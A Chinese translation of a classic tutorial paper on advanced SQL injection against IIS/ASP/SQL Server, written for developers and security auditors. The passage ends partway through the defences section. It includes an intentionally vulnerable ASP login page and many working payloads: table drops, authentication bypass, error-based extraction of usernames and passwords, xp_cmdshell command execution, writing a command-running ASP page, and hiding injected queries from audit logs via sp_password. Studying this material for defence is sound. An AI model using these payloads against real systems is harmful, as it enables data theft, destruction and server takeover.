### SQL inject MS SQL Server {#sql-inject-ms-sql-server}

[http://bbs.51cto.com/thread-886-1.html](http://bbs.51cto.com/thread-886-1.html)

SQL Server 应用程序中的高级SQL注入

摘要：

这份文档是详细讨论SQL注入技术，它适应于比较流行的IIS+ASP+SQLSERVER平台。它讨论了哪些SQL语句能通过各种各样的方法注入到应用程序中，并且记录与攻击相关的数据确认和数据库锁定。

这份文档的预期读者为与数据库通信的WEB程序的开发者和那些扮演审核WEB应用程序的安全专家。

介绍：

SQL是一种用于关系数据库的结构化查询语言。它分为许多种，但大多数都松散地基于美国国家标准化组织最新的标准SQL-92。典型的执行语句是 query，它能够收集比较有达标性的记录并返回一个单一的结果集。SQL语言可以修改数据库结构（数据定义语言）和操作数据库内容（数据操作语言）。在这份文档中，我们将特别讨论SQLSERVER所使用的Transact-SQL语言。

当一个攻击者能够通过往query中插入一系列的sql语句来操作数据写入到应用程序中去，我们管这种方法定义成SQL注入。

一个典型的SQL语句如下：

Select id,forename,surname from authors

这条语句将返回authors表中所有行的id，forename和surname列。这个结果可以被限制，例如：

Select id,forename,surname from authors where forename&amp;apos;john&amp;apos; and surname=&amp;apos;smith&amp;apos;

需要着重指明的是字符串&amp;apos;john&amp;apos;和&amp;apos;smith&amp;apos;被单引号限制。明确的说，forename和surname字段是被用户提供的输入限制的，攻击者可以通过输入值来往这个查询中注入一些SQL语句，

如下：

Forename：jo&amp;apos;hn

Surname：smith

查询语句变为：

Select id,forename,surname from authors where forename=&amp;apos;jo&amp;apos;hn&amp;apos; and surname=&amp;apos;smith&amp;apos;

当数据库试图去执行这个查询时，它将返回如下错误：

Server：Msg 170, Level 15, State 1, Line 1

Line 1：Incorrect syntax near &amp;apos;hn&amp;apos;

造成这种结果的原因是插入了.作为定界符的单引号。数据库尝试去执行&amp;apos;hn&amp;apos;，但是失败。如果攻击者提供特别的输入如：

Forename：jo&amp;apos;;drop table authors-

Surname：

结果是authors表被删除，造成这种结果的原因我们稍后再讲。

看上去好象通过从输入中去掉单引号或者通过某些方法避免它们都可以解决这个问题。这是可行的，但是用这种方法做解决方法会存在几个困难。第一，并不是所有用户提供的数据都是字符串。如果用户输入的是通过用户id来查询author，那我们的查询应该像这样：

Select id,forename,surname from authors where id=1234

在这种情况下，一个攻击者可以非常简单地在数字的结尾添加SQL语句，在其他版本的SQL语言中，使用各种各样的限定符号；在数据库管理系统JET引擎中，数据可以被使用&amp;apos;#&amp;apos;限定。第二，避免单引号尽管看上去可以，但是是没必要的，原因我们稍后再讲。

我们更进一步地使用一个简单的ASP登陆页面来指出哪些能进入SQLSERVER数据库并且尝试鉴别进入一些虚构的应用程序的权限。

这是一个提交表单页的代码，让用户输入用户名和密码：

&lt;HTML&gt;

&lt;HEAD&gt;

&lt;TITLE&gt;Login Page&lt;/TITLE&gt;

&lt;/HEAD&gt;

&lt;BODY bgcolor=&amp;apos;000000&amp;apos; text=&amp;apos;cccccc&amp;apos;&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;cccccc&amp;apos;&gt;

&lt;CENTER&gt;&lt;H1&gt;Login&lt;/H1&gt;

&lt;FORM action=&amp;apos;process_loginasp&amp;apos; method=post&gt;

&lt;TABLE&gt;

&lt;TR&gt;&lt;TD&gt;Username：&lt;/TD&gt;&lt;TD&gt;&lt;INPUT type=text name=username size=100 width=100&gt;&lt;/TD&gt;&lt;/TR&gt;

&lt;TR&gt;&lt;TD&gt;Password：&lt;/TD&gt;&lt;TD&gt;&lt;INPUT type=password name=password size=100 withd=100&gt;&lt;/TD&gt;&lt;/TR&gt;

&lt;/TABLE&gt;

&lt;INPUT type=submit value=&amp;apos;Submit&amp;apos;&gt;&lt;INPUT type=reset value=&amp;apos;Reset&amp;apos;&gt;

&lt;/FORM&gt;

&lt;/Font&gt;

&lt;/BODY&gt;

&lt;/HTML&gt;

下面是process_login.asp的代码，它是用来控制登陆的：

&lt;HTML&gt;

&lt;BODY bgcolor=&amp;apos;000000&amp;apos; text=&amp;apos;ffffff&amp;apos;&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;ffffff&amp;apos;&gt;

&lt;STYLE&gt;

p { font-size=20pt ! important}

font { font-size=20pt ! important}

h1 { font-size=64pt ! important}

&lt;/STYLE&gt;

&lt;%@LANGUAGE = JScript %&gt;

&lt;%

function trace( str ) {

if( Request.form(&quot;debug&quot;) == &quot;true&quot; )

Response.write( str );

}

function Login( cn ) {

var username;

var password;

username = Request.form(&quot;username&quot;);

password = Request.form(&quot;password&quot;);

var rso = Server.CreateObject(&quot;ADODB.Recordset&quot;);

var sql = &quot;select * from users where username = &amp;apos;&quot; + username + &quot;&amp;apos; and password = &amp;apos;&quot; + password + &quot;&amp;apos;&quot;; trace( &quot;query: &quot; + sql );

rso.open( sql, cn );

if (rso.EOF) {

rso.close();

%&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;cc0000&amp;apos;&gt;

&lt;H1&gt; &lt;BR&gt;&lt;BR&gt;

&lt;CENTER&gt;ACCESS DENIED&lt;/CENTER&gt;

&lt;/H1&gt;

&lt;/BODY&gt;

&lt;/HTML&gt;

&lt;% Response.end return; }

else {

Session(&quot;username&quot;) = &quot;&quot; + rso(&quot;username&quot;);

%&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;00cc00&amp;apos;&gt;

&lt;H1&gt; &lt;CENTER&gt;ACCESS GRANTED&lt;BR&gt; &lt;BR&gt;

Welcome, &lt;% Response.write(rso(&quot;Username&quot;)); Response.write( &quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot; ); Response.end }

}

function Main() { //Set up connection

var username

var cn = Server.createobject( &quot;ADODB.Connection&quot; );

cn.connectiontimeout = 20;

cn.open( &quot;localserver&quot;, &quot;sa&quot;, &quot;password&quot; );

username = new String( Request.form(&quot;username&quot;) );

if( username.length &gt; 0) {

Login( cn );

}

cn.close();

}

Main();

%&gt;

出现问题的地方是process_lgin.asp中产生查询语句的部分：

Var sql=&quot;select * from users where username=&amp;apos;&quot;+username+&quot;&amp;apos; and password=&amp;apos;&quot;+password+&quot;&amp;apos;&quot;;

如果用户输入的信息如下：

Username：&amp;apos;;drop table users-

Password：

数据库中表users将被删除，拒绝任何用户进入应用程序。&amp;apos;-&amp;apos;符号在Transact-SQL中表示忽略&amp;apos;-&amp;apos;以后的语句，&amp;apos;;&amp;apos;符号表示一个查询的结束和另一个查询的开始。&amp;apos;-&amp;apos;位于username字段中是必须的，它为了使这个特殊的查询终止，并且不返回错误。

攻击者可以只需提供他们知道的用户名，就可以以任何用户登陆，使用如下输入：

Username：admin&amp;apos;-

攻击者可以使用users表中第一个用户，输入如下：

Username：&amp;apos; or 1=1-

更特别地，攻击者可以使用完全虚构的用户登陆，输入如下：

Username：&amp;apos; union select 1,&amp;apos;fictional_user&amp;apos;,&amp;apos;some_password&amp;apos;,1-

这种结果的原因是应用程序相信攻击者指定的是从数据库中返回结果的一部分。

通过错误消息获得信息

这个几乎是David Litchfield首先发现的，并且通过作者渗透测试的；后来David写了一份文档，后来作者参考了这份文档。这些解释讨论了&amp;apos;错误消息&amp;apos;潜在的机制，使读者能够完全地了解它，潜在地引发他们的能力。

为了操作数据库中的数据，攻击者必须确定某些数据库和某些表的结构。例如我们可以使用如下语句创建user表：

Create talbe users(

Id int,

Username varchar(255),

Password varchar(255),

Privs int

)

然后将下面的用户插入到users表中：

Insert into users values(0,&amp;apos;admin&amp;apos;,&amp;apos;r00tr0x!&amp;apos;,0xffff)

Insert into users values(0,&amp;apos;guest&amp;apos;,&amp;apos;guest&amp;apos;,0x0000)

Insert into users values(0,&amp;apos;chris&amp;apos;,&amp;apos;password&amp;apos;,0x00ff)

Insert into users values(0,&amp;apos;fred&amp;apos;,&amp;apos;sesame&amp;apos;,0x00ff)

如果我们的攻击者想插入一个自己的用户。在不知道users表结构的情况下，他不可能成功。即使他比较幸运，至于privs字段不清楚。攻击者可能插入一个&amp;apos;1&amp;apos;，这样只给他自己一个低权限的用户。

幸运地，如果从应用程序（默认为ASP行为）返回错误消息，那么攻击者可以确定整个数据库的结构，并且可以以程序中连接SQLSERVER的权限度曲任何值。

（下面以一个简单的数据库和asp脚本来举例说明他们是怎么工作的）

首先，攻击者想获得建立用户的表的名字和字段的名字，要做这些，攻击者需要使用select语法的having子句：

Username：&amp;apos; having 1=1-

这样将会出现如下错误：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e14&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Column &amp;apos;users.id&amp;apos; is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.

/process_login.asp, line 35

因此现在攻击者知道了表的名字和第一个地段的名字。他们仍然可以通过把字段放到group by子句只能感去找到一个一个字段名，如下：

Username：&amp;apos; group by users.id having 1=1-

出现的错误如下：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e14&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Column &amp;apos;users.username&amp;apos; is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.

/process_login.asp, line 35

最终攻击者得到了username字段后：

&amp;apos; group by users.id,users.username,users.password,users.privs having 1=1-

这句话并不产生错误，相当于：

select * from users where username=&amp;apos;&amp;apos;

因此攻击者现在知道查询涉及users表，按顺序使用列&amp;apos;id,username,password,privs&amp;apos;。

能够确定每个列的类型是非常有用的。这可以通过使用类型转化来实现，例如：

Username：&amp;apos; union select sum(username) from users-

这利用了SQLSERVER在确定两个结果集的字段是否相等前应用sum子句。尝试去计算sum会得到以下消息：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.

/process_login.asp, line 35

这告诉了我们&amp;apos;username&amp;apos;字段的类型是varchar。如果是另一种情况，我们尝试去计算sum()的是数字类型，我们得到的错误消息告诉我们两个集合的字段数量不相等。

Username：&amp;apos; union select sum(id) from users-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e14&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.

/process_login.asp, line 35

我们可以用这种技术近似地确定数据库中任何表中的任何字段的类型。

这样攻击者就可以写一个好的insert查询，例如：

Username：&amp;apos;;insert into users values(666,&amp;apos;attacker&amp;apos;,&amp;apos;foobar&amp;apos;,&amp;apos;0xffff)-

这种技术的潜在影响不仅仅是这些。攻击者可以利用这些错误消息显示环境信息或数据库。通过运行一列一定格式的字符串可以获得标准的错误消息：

select * from master ..sysmessages

解释这些将实现有趣的消息。

一个特别有用的消息关系到类型转化。如果你尝试将一个字符串转化成一个整型数字，那么字符串的所有内容会返回到错误消息中。例如在我们简单的登陆页面中，在username后面会显示出SQLSERVER的版本和所运行的操作系统信息：

Username：&amp;apos; union select @@version,1,1,1-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value &amp;apos;Microsoft SQL Server 2000 - 8.00.194 (Intel X86) Aug 6 2000 00:57:48 Copyright (c) 1988-2000 Microsoft Corporation Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 2) &amp;apos; to a column of data type int.

/process_login.asp, line 35

这句尝试去将内置的&amp;apos;@@version&amp;apos;常量转化成一个整型数字，因为users表中的第一列是整型数字。

这种技术可以用来读取数据库中任何表的任何值。自从攻击者对用户名和用户密码比较感兴趣后，他们比较喜欢去从users表中读取用户名，例如：

Username：&amp;apos; union select min(username),1,1,1 from users where username&gt;&amp;apos;a&amp;apos;-

这句选择users表中username大于&amp;apos;a&amp;apos;中的最小值，并试图把它转化成一个整型数字：

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;admin&amp;apos; to a column of data type int.

/process_login.asp, line 35

因此攻击者已经知道用户admin是存在的。这样他就可以重复通过使用where子句和查询到的用户名去寻找下一个用户。

Username：&amp;apos; union select min(username),1,1,1 from users where username&gt;&amp;apos;admin&amp;apos;-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;chris&amp;apos; to a column of data type int.

/process_login.asp, line 35

一旦攻击者确定了用户名，他就可以开始收集密码：

Username：&amp;apos; union select password,1,1,1 from users where username=&amp;apos;admin&amp;apos;-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;r00tr0x!&amp;apos; to a column of data type int.

/process_login.asp, line 35

一个更高级的技术是将所有用户名和密码连接长一个单独的字符串，然后尝试把它转化成整型数字。这个例子指出：Transavt-SQL语法能够在不改变相同的行的意思的情况下把它们连接起来。下面的脚本将把值连接起来：

begin declare @ret varchar(8000)

set @ret=&amp;apos;:&amp;apos;

select @ret=@ret+&amp;apos; &amp;apos;+username+&amp;apos;/&amp;apos;+password from users where

username&gt;@ret

select @ret as ret into foo

end

攻击者使用这个当作用户名登陆（都在一行）

Username: &amp;apos;; begin declare @ret varchar(8000) set @ret=&amp;apos;:&amp;apos; select @ret=@ret+&amp;apos; &amp;apos;+username+&amp;apos;/&amp;apos;+password from users where username&gt;@ret select @ret as ret into foo end-

这就创建了一个foo表，里面只有一个单独的列&amp;apos;ret&amp;apos;，里面存放着我们得到的用户名和密码的字符串。正常情况下，一个低权限的用户能够在同一个数据库中创建表，或者创建临时数据库。

然后攻击者就可以取得我们要得到的字符串：

Username：&amp;apos; union select ret,1,1,1 from foo-

Microsoft OLE DB Provider for ODBC Drivers error &amp;apos;80040e07&amp;apos;

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value &amp;apos;: admin/r00tr0x! guest/guest chris/password fred/sesame&amp;apos; to a column of data type int.

/process_login.asp, line 35

然后丢弃（删除）表来清楚脚印：

Username：&amp;apos;; drop table foo-

这个例子仅仅是这种技术的一个表面的作用。没必要说，如果攻击者能够从数据库中获得足够的错误西，他们的工作就变的无限简单。

获得更高的权限

一旦攻击者控制了数据库，他们就想利用那个权限去获得网络上更高的控制权。这可以通过许多途径来达到：

1\. 在数据库服务器上，以SQLSERVER权限利用xp_cmdshell扩展存储过程执行命令。

2\. 利用xp_regread扩展存储过程去读注册表的键值，当然包括SAM键（前提是SQLSERVER是以系统权限运行的）

3\. 利用其他存储过程去改变服务器

4\. 在连接的服务器上执行查询

5\. 创建客户扩展存储过程去在SQLSERVER进程中执行溢出代码

6\. 使用&amp;apos;bulk insert&amp;apos;语法去读服务器上的任意文件

7\. 使用bcp在服务器上建立任意的文本格式的文件

8\. 使用sp_OACreate,sp_OAMethod和sp_OAGetProperty系统存储过程去创建ActiveX应用程序，使它能做任何ASP脚本可以做的事情

这些只列举了非常普通的可能攻击方法的少量，攻击者很可能使用其它方法。我们介绍收集到的攻击关于SQL服务器的明显攻击方法，为了说明哪方面可能并被授予权限去注入SQL.。我们将依次处理以上提到的各种方法.

[xp_cmdshell]

许多存储过程被创建在SQLSERVER中，执行各种各样的功能，例如发送电子邮件和与注册表交互。

Xp_cmdshell是一个允许执行任意的命令行命令的内置的存储过程。例如：

Exec master..xp_cmdshell &amp;apos;dir&amp;apos;

将获得SQLSERVER进程的当前工作目录中的目录列表。

Exec master..xp_cmdshell &amp;apos;net user&amp;apos;

将提供服务器上所有用户的列表。当SQLSERVER正常以系统帐户或域帐户运行时，攻击者可以做出更严重的危害。

[xp_regread]

另一个有用的内置存储过程是xp_regXXXX类的函数集合。

Xp_regaddmultistring

Xp_regdeletekey

Xp_regdeletevalue

Xp_regenumkeys

Xp_regenumvalues

Xp_regread

Xp_regremovemultistring

Xp_regwrite

这些函数的使用方法举例如下：

exec xp_regread HKEY_LOCAL_MACHINE,&amp;apos;SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&amp;apos;, &amp;apos;nullsessionshares&amp;apos;

这将确定什么样的会话连接在服务器上是可以使用的

exec xp_regenumvalues HKEY_LOCAL_MACHINE,&amp;apos;SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities&amp;apos;

这将显示服务器上所有SNMP团体配置。在SNMP团体很少被更改和在许多主机间共享的情况下，有了这些信息，攻击者或许会重新配置同一网络中的网络设备。

这很容易想象到一个攻击者可以利用这些函数读取SAM，修改系统服务的配置，使它下次机器重启时启动，或在下次任何用户登陆时执行一条任意的命令。

[其他存储过程]

xp_servicecontrol过程允许用户启动，停止，暂停和继续服务：

exec master..xp_servicecontrol &amp;apos;start&amp;apos;,&amp;apos;schedule&amp;apos;

exec master..xp_servicecontrol &amp;apos;start&amp;apos;,&amp;apos;server&amp;apos;

下表中列出了少量的其他有用的存储过程：

Xp_availablemedia 显示机器上有用的驱动器

Xp_dirtree 允许获得一个目录树

Xp_enumdsn 列举服务器上的ODBC数据源

Xp_loginconfig Reveals information about the security mode of the server

Xp_makecab 允许用户在服务器上创建一个压缩文件

Xp_ntsec_enumdomains 列举服务器可以进入的域

Xp_terminate_process 提供进程的进程ID，终止此进程

[Linked Servers]

SQL SERVER提供了一种允许服务器连接的机制，也就是说允许一台数据库服务器上的查询能够操作另一台服务器上的数据。这个链接存放在 master.sysservers表中。如果一个连接的服务器已经被设置成使用&amp;apos;sp_addlinkedsrvlogin&amp;apos;过程，当前可信的连接不用登陆就可以访问到服务器。&amp;apos;openquery&amp;apos;函数允许查询脱离服务器也可以执行。

[Custom extended stored procedures]

扩展存储过程应用程序接口是相当简单的，创建一个携带恶意代码的扩展存储过程动态连接库是一个相当简单的任务。使用命令行有几个方法可以上传动态连接库到SQL服务器上，还有其它包括了多种自动通讯的通讯机制，比如HTTP下载和FTP脚本。

一旦动态连接库文件在机器上运行即SQL服务器能够被访问--这不需要它自己是SQL服务器--攻击者就能够使用下面的命令添加扩展存储过程（这种情况下，我们的恶意存储过程就是一个能输出服务器的系统文件的小的木马）：

Sp_addextendedproc &amp;apos;xp_webserver&amp;apos;,&amp;apos;c:\temp\xp_foo.dll&amp;apos;

在正常的方式下，这个扩展存储过程可以被运行：

exec xp_webserver

一旦这个程序被运行，可以使用下面的方法将它除去：

xp_dropextendedproc &amp;apos;xp_webserver&amp;apos;

[将文本文件导入表]

使用&amp;apos;bulk insert&amp;apos;语法可以将一个文本文件插入到一个临时表中。简单地创建这个表：

create table foo( line varchar(8000) )

然后执行bulk insert操作把文件中的数据插入到表中，如：

bulk insert foo from &amp;apos;c:\inetpub\wwwroot\process_login.asp&amp;apos;

可以使用上述的错误消息技术，或者使用&amp;apos;union&amp;apos;选择，使文本文件中的数据与应用程序正常返回的数据结合，将数据取回。这个用来获取存放在数据库服务器上的脚本源代码或者ASP脚本代码是非常有用的。

[使用bcp建立文本文件]

使用&amp;apos;bulk insert&amp;apos;的相对技术可以很容易建立任意的文本文件。不幸的是这需要命令行工具。&amp;apos;bcp&amp;apos;,即&amp;apos;bulk copy program&amp;apos;

既然 bcp可以从SQL服务进程外访问数据库，它需要登陆。这代表获得权限不是很困难，既然攻击者能建立，或者利用整体安全机制(如果服务器配置成可以使用它)。

命令行格式如下：

bcp &quot;select * from text..foo&quot; queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar

&amp;apos;S&amp;apos;参数为执行查询的服务器，&amp;apos;U&amp;apos;参数为用户名，&amp;apos;P&amp;apos;参数为密码，这里为&amp;apos;foobar&amp;apos;

[ActiveX automation scripts in SQL SERVER]

SQL SERVER中提供了几个内置的允许创建ActiveX自动执行脚本的存储过程。这些脚本和运行在windows脚本解释器下的脚本，或者ASP脚本程序一样--他们使用VBScript或javascript书写，他们创建自动执行对象并和它们交互。一个自动执行脚本使用这种方法书写可以在 Transact-SQL中做任何在ASP脚本中，或者WSH脚本中可以做的任何事情。为了阐明这鞋，这里提供了几个例子：

（1）这个例子使用&amp;apos;wscript.shell&amp;apos;对象建立了一个记事本的实例：

wscript.shell example

declare @o int

exec sp_oacreate &amp;apos;wscript.shell&amp;apos;,@o out

exec sp_oamethod @o,&amp;apos;run&amp;apos;,NULL,&amp;apos;notepad.exe&amp;apos;

我们可以通过指定在用户名后面来执行它：

Username：&amp;apos;; declare @o int exec sp_oacreate &amp;apos;wscript.shell&amp;apos;,@o out exec sp_oamethod @o,&amp;apos;run&amp;apos;,NULL,&amp;apos;notepad.exe&amp;apos;-

(2)这个例子使用&amp;apos;scripting.filesystemobject&amp;apos;对象读一个已知的文本文件：

--scripting.filesystemobject example - read a known file

declare @o int, @f int, @t int, @ret int

declare @line varchar(8000)

exec sp_oacreate &amp;apos;scripting.filesystemobject&amp;apos;, @o out

exec sp_oamethod @o, &amp;apos;opentextfile&amp;apos;, @f out, &amp;apos;c:\boot.ini&amp;apos;, 1

exec @ret=sp_oamethod @f,&amp;apos;readline&amp;apos;,@line out

while(@ret=0)

begin

print @line

exec @ret=sp_oamethod @f,&amp;apos;readline&amp;apos;,@line out

end

(3)这个例子创建了一个能执行通过提交到的任何命令：

-- scripting.filesystemobject example - create a &amp;apos;run this&amp;apos;.asp file

declare @o int,@f int,@t int,@ret int

exec sp_oacreate &amp;apos;scripting.filesystemobject&amp;apos;,@o out

exec sp_oamethod @o,&amp;apos;createtextfile&amp;apos;,@f out,&amp;apos;c:\inetpub\wwwroot\foo.asp&amp;apos;,1

exec @ret=sp_oamethod @f,&amp;apos;writeline&amp;apos;,NULL,&amp;apos;&amp;apos;

需要指出的是如果运行的环境是WIN NT4+IIS4平台上，那么通过这个程序运行的命令是以系统权限运行的。在IIS5中，它以一个比较低的权限IWAM_XXXaccount运行。

(4)这些例子阐述了这个技术的适用性；它可以使用&amp;apos;speech.voicetext&amp;apos;对象引起SQL SERVER发声：

declare @o int,@ret int

exec sp_oacreate &amp;apos;speech.voicetext&amp;apos;,@o out

exec sp_oamethod @o,&amp;apos;register&amp;apos;,NULL,&amp;apos;foo&amp;apos;,&amp;apos;bar&amp;apos;

exec sp_oasetproperty @o,&amp;apos;speed&amp;apos;,150

exec sp_oamethod @o,&amp;apos;speak&amp;apos;,NULL,&amp;apos;all your sequel servers are belong to,us&amp;apos;,528

waitfor delay &amp;apos;00:00:05&amp;apos;

我们可以在我们假定的例子中，通过指定在用户名后面来执行它（注意这个例子不仅仅是注入一个脚本，同时以admin权限登陆到应用程序）：

Username：admin&amp;apos;;declare @o int,@ret int exec sp_oacreate &amp;apos;speech.voicetext&amp;apos;,@o out exec sp_oamethod @o,&amp;apos;register&amp;apos;,NULL,&amp;apos;foo&amp;apos;,&amp;apos;bar&amp;apos; exec sp_oasetproperty @o,&amp;apos;speed&amp;apos;,150 exec sp_oamethod @o,&amp;apos;speak&amp;apos;,NULL,&amp;apos;all your sequel servers are belong to us&amp;apos;,528 waitfor delay &amp;apos;00:00:05&amp;apos;--

[存储过程]

传说如果一个ASP应用程序在数据库中使用了存储过程，那么SQL注入是不可能的。这句话只对了一半，这要看ASP脚本中调用这个存储过程的方式。

本质上，如果一个有参数的查询被执行 ，并且用户提供的参数通过安全检查才放入到查询中，那么SQL注入明显是不可能发生的。但是如果攻击者努力影响所执行查询语句的非数据部分，这样他们就可能能够控制数据库。

比较好的常规的标准是：

?如果一个ASP脚本能够产生一个被提交的SQL查询字符串，即使它使用了存储过程也是能够引起SQL注入的弱点。

?如果一个ASP脚本使用一个过程对象限制参数的往存储过程中分配（例如ADO的用于参数收集的command对象），那么通过这个对象的执行，它一般是安全的。

明显地，既然新的攻击技术始终地被发现，好的惯例仍然是验证用户所有的输入。

为了阐明存储过程的查询注入，执行以下语句：

sp_who &amp;apos;1&amp;apos; select * from sysobjects

or

sp_who &amp;apos;1&amp;apos;;select * from sysobjects

任何一种方法，在存储过程后，追加的查询依然会执行。

[高级SQL注入]

通常情况下，一个web应用程序将会过滤单引号（或其他符号），或者限定用户提交的数据的长度。

在这部分，我们讨论一些能帮助攻击者饶过那些明显防范SQL注入，躲避被记录的技术。

[没有单引号的字符串]

有时候开发人员会通过过滤所有的单引号来保护应用程序，他们可能使用VBScript中的replace函数或类似：

function escape(input)

input=replace(input,&quot;&amp;apos;&quot;,&quot;&amp;apos;&amp;apos;&quot;)

escape=input

end function

无可否认地这防止了我们所有例子的攻击，再除去&amp;apos;;&amp;apos;符号也可以帮很多忙。但是在一个大型的应用程序中，好象个别值期望用户输入的是数字。这些值没有被限定，因此为攻击者提供了一个SQL注入的弱点。

如果攻击者想不使用单引号产生一个字符串值，他可以使用char函数，例如：

insert into users values(666,

char(0x63)+char(0x68)+char(0x72)+char90x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char90x69)+char(0x73),

0xffff)

这就是一个能够往表中插入字符串的不包含单引号的查询。

淡然，如果攻击者不介意使用一个数字用户名和密码，下面的语句也同样会起作用：

insert into users values(667,

123,

123,

oxffff)

SQL SERVER自动地将整型转化为varchar型的值。

[Second-Order SQL Injection]

即使应用程序总是过滤单引号，攻击者依然能够注入SQL同样通过应用程序使数据库中的数据重复使用。

例如，攻击者可能利用下面的信息在应用程序中注册：

Username：admin&amp;apos;-

Password：password

应用程序正确过滤了单引号，返回了一个类似这样的insert语句：

insert into users values(123,&amp;apos;admin&amp;apos;&amp;apos;-&amp;apos;,&amp;apos;password&amp;apos;,0xffff)

我们假设应用程序允许用户修改自己的密码。这个ASP脚本程序首先保证用户设置新密码前拥有正确的旧密码。代码如下：

username = escape( Request.form(&quot;username&quot;) );

oldpassword = escape( Request.form(&quot;oldpassword&quot;) );

newpassword = escape( Request.form(&quot;newpassword&quot;) );

var rso = Server.CreateObject(&quot;ADODB.Recordset&quot;);

var sql = &quot;select * from users where username = &amp;apos;&quot; + username + &quot;&amp;apos; and password = &amp;apos;&quot; + oldpassword + &quot;&amp;apos;&quot;;

rso.open( sql, cn );

if (rso.EOF)

{

…

设置新密码的代码如下：

sql = &quot;update users set password = &amp;apos;&quot; + newpassword + &quot;&amp;apos; where username = &amp;apos;&quot; + rso(&quot;username&quot;) + &quot;&amp;apos;&quot;

rso(&quot;username&quot;)为登陆查询中返回的用户名

当username为admin&amp;apos;-时，查询语句为：

update users set password = &amp;apos;password&amp;apos; where username=&amp;apos;admin&amp;apos;-&amp;apos;

这样攻击者可以通过注册一个admin&amp;apos;-的用户来根据自己的想法来设置admin的密码。

这是一个非常严重的问题，目前在大型的应用程序中试图去过滤数据。最好的解决方法是拒绝非法输入，这胜于简单地努力去修改它。这有时会导致一个问题，非法的字符在那里是必要的，例如在用户名中包含&amp;apos;符号，例如

O&amp;apos;Brien

从一个安全的观点来看，最好的解答是但引号不允许存在是一个简单的事实。如果这是无法接受的话，他们仍然要被过滤；在这种情况下，保证所有进入SQL查询的数据都是正确的是最好的方法。

如果攻击者不使用任何应用程序莫名其妙地往系统中插入数据，这种方式的攻击也是可能的。应用程序可能有email接口，或者可能在数据库中可以存储错误日志，这样攻击者可以努力控制它。验证所有数据，包括数据库中已经存在的数据始终是个好的方法。确认函数将被简单地调用，例如：

if(not isValid(&quot;email&quot;,request.querystring(&quot;email&quot;))) then

response.end

或者类似的方法。

[长度限制]

为了给攻击者更多的困难，有时输入数据的长度是被限制的。当这个阻碍了攻击时，一个小的SQL可以造成很严重的危害。例如：

Username：&amp;apos;;shutdown-

这样只用12个输入字符就将停止SQL SERVER实例。另一个例子是：

drop table  

如果限定长度是在过滤字符串后应用将会引发另一个问题。假设用户名被限定16个字符，密码也被限定16个字符，那么下面的用户名和密码结合将会执行上面提到的shutdown命令：

Username：aaaaaaaaaaaaaaa&amp;apos;

Password：&amp;apos;; shutdown-

原因是应用程序尝试去过滤用户名最后的单引号，但是字符串被切断成16个字符，删除了过滤后的一个单引号。这样的结果就是如果密码字段以单引号开始，它可以包含一些SQL语句。既然这样查询看上去是：

select * from users where username=&amp;apos;aaaaaaaaaaaaaaa&amp;apos;&amp;apos; and password=&amp;apos;&amp;apos;&amp;apos;;shutdown-

实际上，查询中的用户名已经变为：

aaaaaaaaaaaaaaa&amp;apos; and password=&amp;apos;

因此最后的SQL语句会被执行。

[审计]

SQL SERVER包含了丰富的允许记录数据库中的各种事件的审计接口，它包含在sp_traceXXX类的函数中。特别有意思的是能够记录所有SQL语句，然后在服务器上执行的T-SQL的事件。如果这种审计是被激活的，我们讨论的所有注入的SQL查询都将被记录在数据库中，一个熟练的数据库管理员将能够知道发生了什么事。不幸地，如果攻击者追加以下字符串：

Sp_password

到一个Transact-SQL语句中，这个审计机制记录日志如下：

--&amp;apos;sp_password&amp;apos; was found in the text of this event.

-- The text has been replaced with this comment for security reasons.

这种行为发生在所有的T-SQL日记记录中，即使&amp;apos;sp_password&amp;apos;发生在一个注释中。这个过程打算通过sp_password隐藏用户的密码，但这对于一个攻击者来说是非常有用的方法。

因此，为了隐藏所有注入，攻击者需要简单地在&amp;apos;-&amp;apos;注释字符后追加sp_password，例如：

Username：admin&amp;apos;-sp_password

事实上一些被执行的SQL将被记录，但是查询本身将顺利地从日志中消失。

[防范]

这部分讨论针对记述的攻击的一些防范。我们将讨论输入确认和提供一些简单的代码，然后我们将从事SQL SERVER锁定。

[输入验证]

输入验证是一个复杂的题目。比较有代表性的是，自从过于严密地确认倾向于引起部分应用程序的暂停，输入确认问题很难被解决，在项目开发中投入很少的注意力在输入确认上。输入确认不是倾向于将它加入到应用程序的功能当中，因此它一般会被忽视。

下面是一个含有简单代码的讨论输入确认的大纲。这个简单的代码不能直接用于应用程序中，但是它十分清晰地阐明了不同的策略。

不同的数据确认方法可以按以下分类：

1） 努力修改数据使它成为正确的

